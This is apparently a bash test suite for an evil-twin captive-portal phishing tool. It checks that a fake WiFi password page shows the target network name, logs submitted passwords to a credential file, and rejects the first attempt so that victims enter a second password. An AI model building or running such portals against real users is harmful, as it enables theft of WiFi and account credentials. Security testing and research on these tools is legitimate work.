#!/usr/bin/env bash

source "$(dirname "$(readlink -f "$0")")/lib/testlib.sh"

tests_init "$(basename "$0")"

echo "=== WiFi Portal Test Suite ==="
echo

SITES_DIR="$REPO_DIR/attacks/Captive Portal/sites"
PORTAL_SRC="$SITES_DIR/WiFi_tur.portal"
RUN_DIR="$TEST_RUNTIME_DIR/run"
DOCROOT="$RUN_DIR/captive_portal"
LOG="$RUN_DIR/instagram_credentials.log"
STATE="$RUN_DIR/instagram_attempts.json"
SERVER_PID=""

assert_equal() {
  local expected=$1 actual=$2 label=$3
  if [ "$expected" = "$actual" ]; then
    pass "$label"
  else
    fail "$label (expected $expected, got $actual)"
  fi
}

reset_state() {
  rm -f "$LOG" "$LOG".* "$STATE" "$RUN_DIR/hit.txt" "$RUN_DIR/ip_hits" \
    "$RUN_DIR/pwdattempt.txt"
}

count_lines() {
  if [ -f "$1" ]; then
    wc -l <"$1" | tr -d ' '
  else
    echo 0
  fi
}

server_stop() {
  if [ -n "$SERVER_PID" ] && kill -0 "$SERVER_PID" 2>/dev/null; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
  fi
  SERVER_PID=""
}

tests_cleanup_and_stop() {
  server_stop
  tests_cleanup
}
trap tests_cleanup_and_stop EXIT

# ── Generated portals ───────────────────────────────────────────────────────
if command -v python3 >/dev/null 2>&1; then
  if python3 "$REPO_DIR/scripts/build_wifi_portals.py" --check >/dev/null 2>&1; then
    pass "Committed WiFi portals match the templates"
  else
    fail "Committed WiFi portals match the templates (run scripts/build_wifi_portals.py)"
  fi
else
  echo "  SKIP: python3 not available, cannot verify generated portals"
fi

for language in tur en de es fr it pt-br; do
  if [ -f "$SITES_DIR/WiFi_$language.portal/index.html" ]; then
    pass "Portal WiFi_$language exists"
  else
    fail "Portal WiFi_$language exists"
  fi
done

if grep -q '\$APTargetSSID' "$PORTAL_SRC/index.html" \
  && ! grep -q 'name="username"' "$PORTAL_SRC/index.html"; then
  pass "The password page shows the target SSID and asks only for a password"
else
  fail "The password page shows the target SSID and asks only for a password"
fi

if python3 - "$REPO_DIR" <<'PY'
import sys
from pathlib import Path

repo = Path(sys.argv[1])
sys.path.insert(0, str(repo / "gui"))
from controller import CapWifiController

portals = CapWifiController.list_portals(object())
top = [p.name for p in portals[:14]]
expected = ["Instagram"] * 7 + ["WiFi"] * 7
raise SystemExit(0 if top == expected else 1)
PY
then
  pass "Instagram and WiFi portals are grouped at the top of the picker"
else
  fail "Instagram and WiFi portals are grouped at the top of the picker"
fi

mkdir -p "$DOCROOT"
cp "$PORTAL_SRC"/* "$DOCROOT"/

if ! command -v php >/dev/null 2>&1; then
  echo "  SKIP: php not available, cannot exercise submit.php"
  finish_tests
  exit $?
fi

if php -l "$DOCROOT/submit.php" >/dev/null 2>&1; then
  pass "submit.php parses"
else
  fail "submit.php parses"
fi

PORT=$(( 20000 + RANDOM % 20000 ))
BASE="http://127.0.0.1:$PORT"

php -S "127.0.0.1:$PORT" -t "$DOCROOT" >"$TEST_RUNTIME_DIR/server.log" 2>&1 &
SERVER_PID=$!

ready=0
for _ in $(seq 1 50); do
  if curl -s -o /dev/null --max-time 1 "$BASE/index.html"; then
    ready=1
    break
  fi
  sleep 0.1
done

if [ "$ready" -ne 1 ]; then
  fail "PHP development server started"
  finish_tests
  exit $?
fi
pass "PHP development server started"

post() {
  curl -s -o /dev/null -w '%{http_code} %{redirect_url}' --data "$1" "$BASE/submit.php"
}

# ── Request handling ────────────────────────────────────────────────────────
reset_state

result=$(curl -s -o /dev/null -w '%{http_code} %{redirect_url}' "$BASE/submit.php")
assert_equal "302 $BASE/index.html" "$result" "A GET is redirected to the password page"

result=$(post "")
assert_equal "302 $BASE/index.html" "$result" "An empty submission returns to the password page"
assert_equal 0 "$(count_lines "$LOG")" "An empty submission is not logged"

result=$(post 'password=YanlisSifre1')
assert_equal "302 $BASE/error.html" "$result" \
  "The first password attempt shows the error page"
assert_equal 1 "$(count_lines "$LOG")" "The first password attempt is logged once"
assert_equal "	YanlisSifre1" "$(cut -f3,4 "$LOG" | tail -1)" \
  "The password is stored without a username"
assert_equal "YanlisSifre1" "$(tail -1 "$RUN_DIR/pwdattempt.txt")" \
  "The password is mirrored to the CLI pass log file"

result=$(post 'password=YanlisSifre1')
assert_equal "302 $BASE/error.html" "$result" \
  "A repeated submission keeps the retry page"
assert_equal 1 "$(count_lines "$LOG")" "A repeated submission is not logged twice"

result=$(post 'password=YanlisSifre2')
assert_equal "302 $BASE/final.html" "$result" "The second distinct attempt shows the success page"
assert_equal 5 "$(awk -F'\t' 'NR==1 { print NF }' "$LOG")" \
  "A log line has five tab-separated fields"

# A dropped username must not inject an extra column into the shared log.
reset_state
post 'username=attacker&password=YanlisSifre3' >/dev/null
assert_equal 5 "$(awk -F'\t' 'END { print NF }' "$LOG")" \
  "An unexpected username still produces a five-field record"

finish_tests
